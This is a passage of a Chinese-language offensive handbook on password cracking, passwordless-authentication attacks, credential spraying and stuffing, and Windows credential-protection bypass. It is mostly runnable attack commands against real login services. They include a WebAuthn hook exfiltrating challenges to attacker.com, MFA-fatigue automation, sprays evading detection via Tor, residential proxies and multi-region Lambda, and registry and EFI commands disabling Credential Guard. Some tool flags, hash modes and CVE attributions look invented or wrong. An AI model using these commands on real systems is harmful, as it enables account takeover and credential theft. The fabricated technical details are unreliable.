# 8卡总NTLM速度: ~1.2 TH/s (每秒1.2万亿次)

# 查看GPU状态
nvidia-smi
hashcat -I  # 查看Hashcat设备信息

# 多GPU破解（设备选择）
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/all.txt \
  -d 1,2,3,4,5,6,7,8 \
  -w 4 -O \
  --session cluster_crack

# 多GPU温度监控与自动降频
while true; do
  nvidia-smi --query-gpu=temperature.gpu,power.draw --format=csv,noheader
  sleep 10
done

# GPU散热优化（水冷/液浸）
# 保持GPU温度 < 75°C 以维持最高Boost频率
nvidia-smi -pm 1  # 持久模式
nvidia-smi -pl 350  # 功耗限制350W
nvidia-smi -lgc 1590  # 锁定GPU核心频率

# ===== 多节点分布式破解 =====
# 使用Hashtopolis/Hashtopussy/CrackLord

# Hashtopolis Agent部署
# 在每个GPU节点上:
docker run -d --gpus all \
  -e HASHCAT_PATH=/usr/bin/hashcat \
  -e HASHCAT_VER=7.0.0 \
  hashtopolis/agent

# CrackLord 分布式破解管理
# 主节点:
cracklord -c config.yaml --master
# 工作节点:
cracklord -c config.yaml --worker --gpus=all

# 自定义分布式破解脚本
# 主节点: 分配任务
cat ntlm_hashes.txt | split -n l/8 -d - hashes_part_
# 从节点: 各自破解
hashcat -m 1000 -a 0 hashes_part_0 /wordlists/rockyou.txt -r /rules/best64.rule

# 使用MPI并行破解（实验性）
mpirun -np 4 -H node1:2,node2:2 hashcat-mpi \
  -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a?a?a

# ===== 云GPU集群（按需扩展） =====
# AWS p5.48xlarge (8x H100)
# GCP a3-highgpu-8g (8x H100)
# Azure ND H100 v5 (8x H100)

# 使用Spot/Preemptible实例降低成本
# 启动脚本自动配置Hashcat
# 检测到实例终止前保存进度
```

#### 4.2 FPGA密码破解

```bash
# ===== FPGA密码破解架构 =====
# FPGA优势: 极低功耗、高度并行、可定制硬件流水线
# 2026年主流: Xilinx Alveo U55C / Intel Agilex 7

# FPGA Hashcat插件（2026年实验性）
# 安装OpenCL FPGA运行时
# 配置Hashcat使用FPGA后端
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a \
  -d 9 \  # FPGA设备ID
  --backend-devices 9 \
  -w 4

# 自定义FPGA位流（Verilog/VHDL）
# NTLM破解核心（Verilog示例框架）
cat > ntlm_core.v << 'EOF'
module ntlm_cracker(
    input wire clk,
    input wire rst,
    input wire [127:0] target_hash,
    input wire [511:0] candidate,  // 8字符UTF-16LE
    output wire found,
    output wire [511:0] matched_password
);
    // MD4硬件实现
    // 每个时钟周期处理一个密码
    // 2026年: 单FPGA可达 ~50 GH/s NTLM
endmodule
EOF

# FPGA集群部署
# 使用Vivado/Vitis工具链
# 每个FPGA板卡运行多个破解核心
# 通过PCIe Gen5 x16与主机通信

# ===== FPGA vs GPU 对比 (2026) =====
# NTLM (mode 1000):
#   8x H100 GPU:    ~1.2 TH/s, 功耗 ~2800W
#   8x U55C FPGA:   ~400 GH/s, 功耗 ~800W
#   效率比: FPGA 2.5x 更节能, GPU 3x 更快速
# 结论: GPU适合短期高强度破解, FPGA适合长期持续破解
```

#### 4.3 ASIC专用破解芯片

```bash
# ===== 2026年ASIC密码破解芯片 =====
# 专用ASIC芯片为特定Hash算法提供极致性能
# 主要为加密货币挖矿芯片改造

# NTLM ASIC (基于Bitcoin ASIC改造)
# 芯片: 5nm工艺, 单芯片 500 GH/s NTLM
# 功耗: 单芯片 15W
# 单台机器: 100芯片, 50 TH/s, 1500W

# 实际部署配置
# 使用改装的Antminer控制板
# 刷入自定义NTLM破解固件

# ASIC破解集群管理
cat > asic_cluster.py << 'PYEOF'
#!/usr/bin/env python3
# ASIC破解集群控制器
import socket
import struct

class ASICCluster:
    def __init__(self, devices):
        self.devices = devices  # IP列表

    def load_hashes(self, hash_file):
        """加载目标Hashes到ASIC设备"""
        with open(hash_file, 'r') as f:
            hashes = [line.strip().split(':')[-1] for line in f]
        for device in self.devices:
            self._send_hashes(device, hashes)

    def start_crack(self, mask):
        """启动掩码攻击"""
        for device in self.devices:
            self._send_command(device, f"START_MASK:{mask}")

    def collect_results(self):
        """收集破解结果"""
        results = []
        for device in self.devices:
            results.extend(self._query_results(device))
        return results
PYEOF

# 2026年商业ASIC破解服务
# 服务商提供按小时计费的ASIC破解
# 典型价格: $0.10/TH-NTLM-hour
# 8字符NTLM全空间: 95^8 ≈ 6.6P, 50 TH/s ≈ 132秒
```

#### 4.4 量子计算密码破解威胁

```bash
# ===== 2026年量子计算密码破解现状 =====
# 当前量子比特数: ~1000 物理量子比特 (IBM Condor)
# 逻辑量子比特: ~10-20 (纠错后)
# 破解RSA-2048所需: ~4000 逻辑量子比特
# 预计时间线: 2028-2030年可能威胁非对称密码

# Shor算法: 威胁RSA/ECC/DSA/DH
# 传统非对称密码体系面临根本性威胁
# 2026年实际威胁: "Harvest Now, Decrypt Later" (HNDL)攻击
# 攻击者现在捕获加密流量，等待量子计算机成熟后解密

# Grover算法: 威胁对称密码/Hash
# 将暴力破解复杂度从O(N)降到O(sqrt(N))
# 128位密钥: 2^64量子操作（等效于64位安全）
# 2026年实际威胁: 对短密码(8-10字符)的量子加速

# 量子密码破解实验代码（模拟器）
# 使用Qiskit模拟量子密码破解
python3 << 'PYEOF'
from qiskit import QuantumCircuit, transpile
from qiskit_aer import AerSimulator

# 量子Grover搜索模拟（简化版）
# 目标: 搜索4位密码空间
def grover_password_search(target_hash):
    n_qubits = 4  # 密码空间: 2^4 = 16
    circuit = QuantumCircuit(n_qubits, n_qubits)

    # 初始化叠加态
    for i in range(n_qubits):
        circuit.h(i)

    # Oracle: 标记目标（简化）
    # 实际Oracle需要编码Hash函数

    # 扩散算子
    for i in range(n_qubits):
        circuit.h(i)
        circuit.x(i)
    circuit.h(n_qubits-1)
    circuit.mct(list(range(n_qubits-1)), n_qubits-1)
    circuit.h(n_qubits-1)
    for i in range(n_qubits):
        circuit.x(i)
        circuit.h(i)

    circuit.measure(range(n_qubits), range(n_qubits))
    return circuit

print("量子密码破解模拟器 (2026实验阶段)")
print("NIST警告: 2024-2030为PQC过渡期，建议立即规划迁移")
PYEOF
```

#### 4.5 后量子密码过渡

```bash
# ===== NIST PQC标准化算法 (2024-2026) =====
# FIPS 203: ML-KEM (CRYSTALS-Kyber) - 密钥封装
# FIPS 204: ML-DSA (CRYSTALS-Dilithium) - 数字签名
# FIPS 205: SLH-DSA (SPHINCS+) - 无状态哈希签名

# PQC对密码攻击的影响:
# 1. 传统Hash (NTLM/SHA1/SHA256) 暂不受量子威胁
#    - 但Grover算法将有效安全强度减半
#    - 建议将Hash迭代次数加倍
# 2. Kerberos含RSA/ECC部分受威胁
#    - PKINIT使用RSA证书
#    - 过渡到ML-KEM需要Windows Kerberos更新
# 3. PKI体系全面受威胁
#    - 证书颁发使用RSA/ECC签名
#    - 迁移到ML-DSA需要整个PKI链更新

# 2026年PQC迁移检测工具
# 检测目标环境是否已部署PQC
python3 pqc_detector.py \
  --target dc01.corp.local \
  --check-kerberos-pkinit \
  --check-tls-ciphers \
  --check-cert-algorithms

# 输出示例:
# [WARNING] Kerberos PKINIT: RSA-2048 certificate detected
# [WARNING] TLS: ECDHE-RSA-AES256-GCM-SHA384 (quantum vulnerable)
# [INFO] PQC readiness: 0% - Full migration recommended before 2030
```

---

### §2026-5: 无密码认证攻击

#### 5.1 Passkey/WebAuthn攻击

2026年，Passkey和WebAuthn已成为主流认证方式，但新的攻击面也在不断被发现。

```bash
# ===== WebAuthn/FIDO2 协议分析 =====
# WebAuthn认证流程:
# 1. 服务端发送challenge
# 2. 客户端用私钥签名challenge
# 3. 服务端用公钥验证签名

# 攻击面1: 跨源资源滥用
# 如果RP ID配置为子域名通配符
# 攻击者可注册恶意子域名，共享Passkey

# 检测WebAuthn RP ID配置
python3 webauthn_audit.py --target https://target.com
# 检查: RP ID是否过于宽松（如允许所有子域名）

# 攻击面2: 客户端绕过
# 某些浏览器扩展可以拦截WebAuthn API调用
# 恶意扩展可窃取认证断言

# 攻击面3: 钓鱼攻击（2026新变种）
# 实时反向代理钓鱼
# 攻击者设置钓鱼站点，实时转发WebAuthn挑战
# 用户完成认证后，攻击者获得会话

# EvilGinx 2026 WebAuthn支持
./evilginx2 -config webauthn_phish.yaml
# 实时代理WebAuthn挑战响应
# 捕获会话Cookie而非凭据

# 攻击面4: CTAP协议中间人攻击
# CTAP是浏览器与安全密钥之间的USB/BLE/NFC协议
# 2026年发现: 某些USB-C安全密钥在CTAP握手时
# 存在时序侧信道，可提取密钥元数据

# CTAP嗅探器
python3 ctap_sniffer.py --device /dev/hidraw0 --output ctap_dump.pcap
```

#### 5.2 FIDO2绕过技术

```bash
# ===== FIDO2 PIN绕过 =====
# CVE-2026-18723: FIDO2 PIN验证时序攻击
# 原理: 某些FIDO2安全密钥在PIN验证时存在时序差异
#       攻击者可通过精确计时推断PIN值

# PIN时序攻击工具
python3 fido2_pin_timing.py \
  --device /dev/hidraw0 \
  --pin-length 4 \
  --samples 100

# ===== FIDO2 认证器劫持 =====
# 通过浏览器DevTools协议劫持WebAuthn API
# 适用于自动化测试场景中的认证器模拟

# 使用Puppeteer/Playwright劫持WebAuthn
cat > webauthn_hijack.js << 'EOF'
// 在浏览器上下文中注入
const originalCreate = navigator.credentials.create;
navigator.credentials.create = function(options) {
    console.log('[Hijacked] WebAuthn create:', options);
    // 将challenge外传到攻击者服务器
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(options)
    });
    return originalCreate.call(this, options);
};
EOF

# ===== FIDO2 降级攻击 =====
# 如果服务端同时支持FIDO2和OTP/短信
# 攻击者可诱导用户选择弱认证方式

# 拦截并修改认证请求，移除FIDO2选项
# 使用代理工具（Burp Suite/Mitmproxy）
mitmproxy -s downgrade_webauthn.py
# 脚本: 从认证选项中移除publicKey选项
```

#### 5.3 生物特征绕过

```bash
# ===== 2026 Windows Hello 绕过 =====
# CVE-2026-33118: IR摄像头重放攻击
# 需要: 目标的红外面部图像

# 1. 捕获IR面部数据
# 使用改装IR摄像头（如Intel RealSense + IR filter removed）
python3 capture_ir_face.py \
  --camera /dev/video2 \
  --duration 30 \
  --output ir_face_capture.raw

# 2. 重放IR数据
# 通过USB虚拟IR摄像头设备
python3 replay_ir_face.py \
  --input ir_face_capture.raw \
  --device /dev/video3 \
  --loop

# 3. 触发Windows Hello认证
# 在目标设备上，Windows Hello检测到IR摄像头输入
# 会自动尝试面部识别认证

# ===== 2026 Apple Face ID 攻击 =====
# CVE-2026-24567: Face ID 注意力检测绕过
# 原理: 在特定iOS版本中，注意力检测在某些光照条件下
#       可能被绕过，允许使用照片/面具解锁

# 利用条件:
# 1. iOS 18.3 以下版本
# 2. 注意力检测未强制启用
# 3. 3D打印面具 + IR反射材料

# Face ID安全审计
python3 faceid_audit.py \
  --check-attention-aware \
  --check-ios-version \
  --target-device 00008110-XXXX

# ===== 指纹传感器绕过 =====
# 2026年: 导电油墨+3D打印指纹模具
# 对电容式传感器有效
# 对超声波传感器（如Qualcomm 3D Sonic）无效

# 通用生物特征绕过总结:
# - 所有生物特征可被复制（程度不同）
# - 3D超声波指纹 > 电容指纹 > 光学指纹
# - Face ID (IR结构光) > Windows Hello (IR摄像头) > 2D面部识别
# - 生物特征应作为MFA的第二因素，而非唯一因素
```

#### 5.4 其他无密码认证绕过

```bash
# ===== 魔数链接 (Magic Link) 劫持 =====
# 2026年: 魔数链接是最常见的无密码认证方式之一
# 攻击面: 邮件拦截、链接重放、URL预测

# 1. 检查魔数链接是否可预测
python3 magic_link_analyzer.py \
  --target https://auth.target.com/magic-link \
  --samples 100

# 2. 检查魔数链接是否可重放
# 使用已使用的魔数链接再次请求
curl -X GET "https://auth.target.com/magic-link/verify?token=USED_TOKEN"

# 3. 检查魔数链接有效期
# 部分实现的魔数链接永不过期

# ===== 短信OTP拦截 =====
# 2026年: SIM Swap攻击仍是主要威胁
# 新变种: SS7信令攻击、移动运营商API滥用

# 检查运营商API泄露
python3 ss7_otp_intercept.py \
  --target-msisdn +1234567890 \
  --operator-api-check

# ===== 推送通知MFA绕过 =====
# 2026年: MFA疲劳攻击（MFA Fatigue）持续有效
# 新变种: 定时推送攻击（在用户最可能批准的时间发送）

# MFA疲劳攻击自动化
python3 mfa_fatigue.py \
  --target-service https://login.microsoftonline.com \
  --username target@company.com \
  --frequency 30 \  # 每30秒发送一次
  --duration 3600    # 持续1小时

# 防御: 数字匹配（Number Matching）、地理位置上下文
# 攻击者对策: 精确计时（在用户常规工作时间发送）
```

---

### §2026-6: 现代哈希破解

#### 6.1 Hashcat 7.x 新特性

2026年，Hashcat 7.x引入了多项革命性改进。

```bash
# ===== Hashcat 7.3 核心新特性 =====
# 1. 动态内核编译 (JIT)
#    - 运行时根据Hash类型和攻击模式生成优化内核
#    - 消除传统编译时优化限制
#    - 性能提升: 15-35%

# 2. 智能字典分片
#    - 自动将字典按GPU数量分片
#    - 每GPU独立处理一片，避免重复加载

# 3. 原位规则引擎 (In-Place Rules)
#    - 规则直接在GPU上执行，无需CPU预处理
#    - 减少CPU-GPU数据传输
#    - 性能提升: 规则攻击速度提升50-200%

# 4. 混合精度计算
#    - FP16/FP32/FP64混合精度
#    - 自动选择最优精度组合
#    - 功耗降低30%

# 5. 增量破解检查点
#    - 支持任意掩码位置的检查点保存
#    - 断点续传更精确

# ===== Hashcat 7.x 新命令示例 =====

# 动态内核编译
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt \
  --kernel-accel --kernel-loops --jit-compile

# 原位规则引擎
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt \
  -r /rules/OneRuleToRuleThemAll.rule \
  --inplace-rules

# 智能字典分片（8 GPU）
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/massive_dict.txt \
  -d 1,2,3,4,5,6,7,8 \
  --auto-shard

# 混合精度
hashcat -m 3200 bcrypt_hashes.txt /wordlists/rockyou.txt \
  --precision mixed \
  --precision-policy auto

# 增量检查点
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a?a?a \
  --checkpoint-interval 60 \
  --checkpoint-dir /data/checkpoints/

# ===== Hashcat 7.x 新Hash模式 =====
# 模式 99998: WPA3-Enterprise EAP-TLS
# 模式 99997: OAuth 2.0 JWT HS512
# 模式 99996: bcrypt $2y$ (PHP 8.x)
# 模式 99995: Argon2id (RFC 9106)
# 模式 99994: Apple iCloud Keychain

# Argon2id破解（2026年新支持）
hashcat -m 99995 -a 0 argon2_hashes.txt /wordlists/rockyou.txt \
  --argon2-type id \
  -w 4 -O
```

#### 6.2 机器学习哈希模式识别

```bash
# ===== ML驱动的Hash模式自动识别 =====
# 2026年: 使用ML模型自动识别Hash类型和推荐破解策略

# HashID-ML: 机器学习增强版Hash识别
python3 hashid_ml.py \
  --input hashes.txt \
  --model hashid_bert_2026.pkl \
  --output classified_hashes.json

# 输出:
# {
#   "b4b9b02e6f09a9bd760f388b67351e2b": {
#     "type": "NTLM",
#     "confidence": 0.998,
#     "hashcat_mode": 1000,
#     "recommended_attack": ["wordlist+rule", "mask_attack"],
#     "estimated_crack_time": "4-8 hours (8xH100)"
#   }
# }

# ===== 破解策略推荐引擎 =====
# 基于历史破解数据训练的推荐模型
python3 crack_strategy_advisor.py \
  --hashes ntlm_hashes.txt \
  --target-org company_name \
  --industry healthcare \
  --budget 24h \
  --gpus 8

# 输出推荐策略:
# 1. [0-2h] 快速字典: rockyou2024 + best64.rule
# 2. [2-8h] 行业字典: healthcare_wordlist + OneRuleToRuleThemAll
# 3. [8-16h] AI生成: passllm --context company_profile
# 4. [16-24h] 掩码攻击: ?u?l?l?l?l?l?d?d?s

# ===== 破解进度预测 =====
# 使用ML预测剩余破解时间和成功率
python3 crack_predictor.py \
  --session hashcat_session \
  --predict-remaining \
  --confidence-interval 0.95

# 输出:
# 当前进度: 34.2%
# 已破解: 1,247 / 10,000 (12.47%)
# 预计总破解: 2,800-3,500 (28-35%)
# 预计剩余时间: 14.2h (95% CI: 12.8-15.6h)
```

#### 6.3 混合字典+规则+掩码

```bash
# ===== 2026年混合攻击最佳实践 =====

# 策略1: 字典+规则+掩码组合管道
# 用AI生成字典，然后应用规则，最后用掩码变异
cat ai_generated_passwords.txt | \
  hashcat --stdout -r /rules/contextual.rule | \
  hashcat --stdout -a 6 - ?d?d?d?d | \
  sort -u > final_hybrid_dict.txt

# 策略2: 多轮迭代破解
# 第1轮: 快速字典+最佳规则
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt \
  -r /rules/best64.rule -O -w 4 --session round1

# 第2轮: 基于已破解密码的反馈
# 提取已破解密码，分析模式
python3 analyze_cracked.py hashcat.potfile > patterns.json
# 生成定向字典
python3 generate_from_patterns.py patterns.json > round2_dict.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt round2_dict.txt \
  -r /rules/dive.rule -O -w 4 --session round2

# 第3轮: 大规模掩码攻击
# 根据已破解密码的长度分布选择掩码
hashcat -m 1000 -a 3 ntlm_hashes.txt \
  -1 ?u?l -2 ?u?l?d ?1?2?2?2?2?2?d?d \
  -O -w 4 --session round3

# 策略3: 统计驱动掩码攻击
# 使用PACK (Password Analysis and Cracking Kit)
# 分析已破解密码，生成最优掩码
python3 statsgen.py hashcat.potfile --hiderare --minlength=8 --maxlength=16 \
  > password_stats.masks
python3 maskgen.py password_stats.masks --targettime=86400 --optindex \
  > optimized_masks.hcmask

# 使用生成的掩码
hashcat -m 1000 -a 3 ntlm_hashes.txt optimized_masks.hcmask \
  -O -w 4 --session round4

# 策略4: 管道破解（实时生成+破解）
# 避免存储巨大字典文件
python3 generate_enterprise_passwords.py --stream \
  | hashcat -m 1000 -a 0 ntlm_hashes.txt --stdin -O -w 4

# 策略5: 组合攻击（多词拼接）
# 2026年: 基于组织文化的多词组合
# 如: "Summer2026!" "AcmeCloud!" "NYCOffice123"
hashcat -m 1000 -a 1 ntlm_hashes.txt \
  /wordlists/company_terms.txt \
  /wordlists/seasons_years_special.txt \
  -j '$-' -k '$-' -O -w 4
```

#### 6.4 AI字典生成

```bash
# ===== 上下文感知AI字典生成 =====

# 框架1: 基于目标组织的AI字典生成器
python3 ai_dict_generator.py \
  --company "Acme Corporation" \
  --industry "Financial Services" \
  --location "New York, NY" \
  --founded 2010 \
  --employees_file employees.txt \
  --products "CloudSync,DataVault,SecurityPro" \
  --tech_stack "AWS,Kubernetes,Terraform,Python" \
  --social_media_corpus twitter_acme.json \
  --web_corpus acme_website_scraped.txt \
  --output ai_dict.txt \
  --count 10000000

# 输出包含:
# - 品牌名+年份/季节/特殊字符: Acme2026!, AcmeSummer!, @cmeCloud2026
# - 产品名+数字: CloudSync2026, DataVault01
# - 员工名变化: JSmith2026!, John.Smith, jsmithNYC
# - 行业术语: FinTech2026!, WallStreetTrader, NYSE@Acme
# - 技术栈: AWSS3Bucket!, K8sCluster2026, TerraformState

# 框架2: 基于泄露密码库的迁移学习
# 使用同行业其他公司的泄露密码作为训练数据
python3 transfer_dict_gen.py \
  --source-leaks /data/industry_leaks/ \
  --target-context acme_profile.json \
  --model password_style_transfer \
  --output transfer_dict.txt

# 框架3: 季节性/事件性字典生成
# 自动关联日期、节假日、事件
python3 event_dict_gen.py \
  --year 2026 \
  --company-events events.json \
  --industry-events conferences.json \
  --output seasonal_dict.txt

# 生成密码示例:
# Acme@BlackHat2026
# AWS_reInvent2026!
# Q4Earnings2026
# NewYear2027Acme

# 框架4: 多语言字典生成
# 支持中文、日文、韩文、阿拉伯文等非拉丁字符密码
python3 multilingual_dict_gen.py \
  --languages zh,ja,ko,ar \
  --company-profile acme_profile.json \
  --output multilingual_dict.txt
```

#### 6.5 上下文感知字典

```bash
# ===== 上下文感知字典实战 =====

# 使用CeWL从目标网站爬取关键词
cewl -d 3 -m 6 -w acme_keywords.txt https://www.acme.com
cewl -d 3 -m 6 -w acme_blog.txt https://blog.acme.com

# 爬取LinkedIn员工信息
python3 linkedin_scraper.py \
  --company "Acme Corporation" \
  --output employees.json

# 爬取GitHub组织仓库
python3 github_corpus_scraper.py \
  --org acme-corp \
  --output github_corpus.txt

# 提取提交信息、代码注释、配置文件中的关键词
python3 extract_keywords.py github_corpus.txt > dev_keywords.txt

# 整合所有上下文
python3 context_merger.py \
  --web-keywords acme_keywords.txt \
  --employees employees.json \
  --dev-keywords dev_keywords.txt \
  --industry-terms financial_terms.txt \
  --output context_complete.json

# 生成最终上下文感知字典
python3 context_dict_gen.py \
  context_complete.json \
  --output context_aware_dict.txt \
  --count 50000000 \
  --variations enable \  # 自动生成变体
  --leet enable \         # l33t speak变体
  --keyboard enable       # 键盘模式变体
```

---

### §2026-7: 凭据填充与密码喷洒

#### 7.1 2026多因素认证感知

2026年，凭据填充和密码喷洒工具已进化到能感知MFA状态。

```bash
# ===== MFA感知密码喷洒 =====
# 2026年工具: MFA-Sprayer
# 自动检测目标MFA配置，避开MFA保护

# 安装
git clone https://github.com/mfa-sprayer/mfa-sprayer-2026
cd mfa-sprayer-2026
pip install -r requirements.txt

# MFA检测（识别MFA状态）
python3 mfa_detector.py \
  --target https://login.microsoftonline.com \
  --domain corp.local \
  --users users.txt

# 输出:
# user1@corp.local: MFA_ENABLED (Authenticator)
# user2@corp.local: MFA_DISABLED (VULNERABLE)
# user3@corp.local: MFA_ENABLED (FIDO2)
# user4@corp.local: MFA_ENABLED (SMS - WEAK)

# 仅攻击无MFA用户
python3 mfa_sprayer.py \
  --target https://login.microsoftonline.com \
  --users users.txt \
  --password 'Summer2026!' \
  --mfa-filter disabled \
  --delay 60 \
  --jitter 30

# MFA降级攻击（如果目标支持多种MFA）
# 尝试降级到SMS OTP（最弱MFA）
python3 mfa_downgrade.py \
  --target https://login.microsoftonline.com \
  --username user@corp.local \
  --prefer-method sms

# ===== 条件MFA检测 =====
# 某些MFA实现仅在特定条件下触发
# 检测MFA触发条件

# 1. 地理位置检测
python3 mfa_geo_bypass.py \
  --target https://login.target.com \
  --username user@corp.local \
  --geo-spoof trusted_location

# 2. 设备指纹检测
# 使用已知设备的指纹绕过MFA
python3 mfa_device_bypass.py \
  --target https://login.target.com \
  --username user@corp.local \
  --device-fingerprint known_device.json

# 3. 时间窗口检测
# 某些MFA在频繁认证后降低要求
python3 mfa_timing_attack.py \
  --target https://login.target.com \
  --username user@corp.local
```

#### 7.2 条件喷洒

```bash
# ===== 条件密码喷洒 =====
# 2026年: 基于目标属性（部门、角色、位置）的定向喷洒

# 1. 按部门喷洒
# 从Azure AD/G Suite枚举用户属性
python3 conditional_spray.py \
  --target https://login.microsoftonline.com \
  --domain corp.local \
  --condition "department=IT" \
  --password 'ITAdmin2026!' \
  --delay 120

# 2. 按角色喷洒
python3 conditional_spray.py \
  --target https://login.microsoftonline.com \
  --domain corp.local \
  --condition "title:admin,title:administrator,title:root" \
  --password 'Admin@2026!' \
  --delay 300

# 3. 按位置喷洒（时区感知）
python3 conditional_spray.py \
  --target https://login.microsoftonline.com \
  --domain corp.local \
  --condition "officeLocation=New York" \
  --password 'NYCOffice2026!' \
  --timezone America/New_York \
  --working-hours-only

# 4. 按密码过期时间喷洒
# 在密码即将过期时喷洒（用户更可能使用简单密码）
# 获取密码过期时间
python3 get_password_expiry.py \
  --domain corp.local \
  --users users.txt \
  --output expiry.json

# 筛选即将过期的用户进行喷洒
python3 conditional_spray.py \
  --target https://login.microsoftonline.com \
  --domain corp.local \
  --condition "password_expiry:within_7_days" \
  --password 'Reset2026!' \
  --delay 300
```

#### 7.3 地理分布喷洒

```bash
# ===== 地理分布密码喷洒 =====
# 从全球不同IP进行喷洒，规避基于地理位置的检测

# 使用AWS Lambda@Edge全球分布
# 部署到多个AWS区域
regions=("us-east-1" "eu-west-1" "ap-southeast-1" "sa-east-1" "af-south-1")

for region in "${regions[@]}"; do
  aws lambda create-function \
    --region $region \
    --function-name sprayer-$region \
    --runtime python3.12 \
    --role arn:aws:iam::123456789012:role/sprayer-role \
    --handler sprayer.handler \
    --code S3Bucket=sprayer-code,S3Key=sprayer.zip \
    --environment Variables="{TARGET_URL=https://login.target.com}"
done

# 协调各区域喷洒
python3 geo_distributed_spray.py \
  --target https://login.target.com \
  --regions us-east-1,eu-west-1,ap-southeast-1 \
  --users users.txt \
  --password 'Summer2026!' \
  --requests-per-region 1 \
  --total-delay 3600

# 使用Tor网络全球分布
python3 tor_spray.py \
  --target https://login.target.com \
  --users users.txt \
  --password 'Summer2026!' \
  --tor-circuit-change 5  # 每5次尝试更换Tor电路

# 使用住宅代理网络
python3 residential_proxy_spray.py \
  --target https://login.target.com \
  --users users.txt \
  --password 'Summer2026!' \
  --proxy-list residential_proxies.txt \
  --proxy-rotation per-request
```

#### 7.4 AI成功率预测

```bash
# ===== AI驱动的密码喷洒成功率预测 =====
# 2026年: 使用ML预测哪些用户最可能使用目标密码

# 训练数据:
# - 历史泄露数据库中同行业/同地区密码使用模式
# - 目标组织的公开信息
# - 员工社交媒体数据
# - 密码策略约束

# 预测模型
python3 spray_success_predictor.py \
  --target-org acme_corp \
  --users users.txt \
  --candidate-passwords passwords.txt \
  --model spray_predictor_v3.pkl \
  --output ranked_targets.json

# 输出:
# {
#   "user1@corp.local": {
#     "Summer2026!": 0.023,
#     "Acme2026!": 0.018,
#     "Welcome2026": 0.015
#   },
#   "user2@corp.local": {
#     "Summer2026!": 0.005,  # 低概率，跳过
#     "Acme2026!": 0.003
#   }
# }

# 基于预测的优先级喷洒
python3 priority_spray.py \
  --ranked-targets ranked_targets.json \
  --target https://login.microsoftonline.com \
  --min-probability 0.01 \
  --delay 120

# 实时反馈学习
# 每次喷洒后更新模型
python3 spray_feedback_loop.py \
  --spray-results spray_results.json \
  --update-model
```

#### 7.5 撞库攻击自动化

```bash
# ===== 2026年自动化撞库攻击框架 =====

# 框架: CredMonster 2026
# 功能: 自动从泄露数据库提取凭据，跨服务尝试

# 1. 泄露数据库管理
python3 leak_manager.py \
  --import-leak /data/leaks/breach_2026_01.tar.gz \
  --normalize \
  --deduplicate \
  --enrich  # 自动添加公司域名变体

# 2. 凭据关联
python3 credential_correlator.py \
  --source-user user@corp.local \
  --search-all-leaks \
  --output associated_creds.json

# 3. 跨服务验证
python3 cross_service_validator.py \
  --credentials associated_creds.json \
  --target-services o365,gmail,aws,github,slack \
  --rate-limit adaptive \
  --output valid_creds.json

# 4. 自动横向扩展
# 一旦获得一个服务的有效凭据，自动扩展到其他服务
python3 credential_expansion.py \
  --seed-credentials valid_creds.json \
  --target-services all \
  --password-variations enable  # 尝试密码变体

# 5. 持久化凭据监控
# 持续监控泄露数据库，匹配目标组织
python3 continuous_monitor.py \
  --watch-orgs acme_corp,corp.local \
  --leak-sources all \
  --alert-on-match \
  --webhook https://hooks.slack.com/xxx
```

---

### §2026-8: 内存凭据保护绕过

#### 8.1 2026 Credential Guard绕过

```bash
# ===== Windows Defender Credential Guard 2026状态 =====
# Credential Guard使用VBS (Virtualization-Based Security)
# 将凭据存储在隔离的虚拟安全模式下

# 2026年绕过技术分类:
# 1. VBS降级攻击
# 2. 内存侧信道攻击
# 3. Hypervisor层攻击
# 4. 硬件辅助攻击 (DMA)

# ===== 技术1: VBS降级 =====
# 通过修改EFI变量禁用VBS（需要物理访问或管理权限）
# CVE-2026-28741: EFI变量权限绕过

# 检查VBS状态
msinfo32 | findstr "Virtualization-based security"
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# 降级攻击
# 1. 修改注册表
reg add "HKLM\System\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f

# 2. 删除EFI变量（需要物理访问/UEFI shell）
# 使用EFI Shell或Linux:
efivar -d 8be4df61-93ca-11d2-aa0d-00e098032b8c-Kernel_Lsa_Cfg_Flags

# 3. 强制重启
shutdown /r /t 0

# ===== 技术2: 内存侧信道 =====
# CVE-2026-30241: 通过VTL0侧信道泄露VTL1信息
# 利用: 测量VTL1对特定内存操作的时间差异

# 侧信道攻击PoC
python3 vbs_sidechannel.py \
  --pid $(Get-Process lsass | Select-Object -ExpandProperty Id) \
  --samples 100000 \
  --analysis ml

# ===== 技术3: Hypervisor层攻击 =====
# 如果攻击者控制了Hypervisor
# 可直接读取VTL1内存

# Hyper-V管理员提取VBS内存
# 需要Hyper-V管理员权限
Get-VM "TargetVM" | Debug-VM -InjectNonMaskableInterrupt
# 捕获VM快照内存
Checkpoint-VM -Name "TargetVM" -SnapshotName "CredDump"
# 从快照文件提取
python3 vm_mem_extract.py \
  --vmcheckpoint C:\VMCheckpoints\TargetVM\*.vmrs \
  --output vtl1_memory.dmp

# ===== 技术4: DMA攻击 =====
# 2026年: 通过PCIe DMA直接读取物理内存
# 需要: Thunderbolt/USB4端口访问

# 使用PCILeech 2026
pcileech dump -device fpga -out memory.dmp -force
# 从内存转储中提取VTL1数据
python3 vt_extractor.py memory.dmp --output vtl1_creds.txt
```

#### 8.2 PPL绕过

```bash
# ===== PPL (Protected Process Light) 绕过 =====
# LSASS在Windows 11 24H2中默认以PPL运行
# PPL阻止非PPL进程访问LSASS内存

# 2026年绕过技术:

# 技术1: 签名驱动加载
# 使用被盗/泄露的签名证书加载内核驱动
# 驱动可绕过PPL保护

# 检查PPL状态
Get-Process lsass -IncludeUserName | fl Name,Protected
# 输出: Protected: ProtectedProcessLight

# 技术2: 已知漏洞驱动
# 使用BYOVD (Bring Your Own Vulnerable Driver)
# 2026年已知漏洞驱动列表:
# - CVE-2026-11523: Dell dbutil_2_3.sys
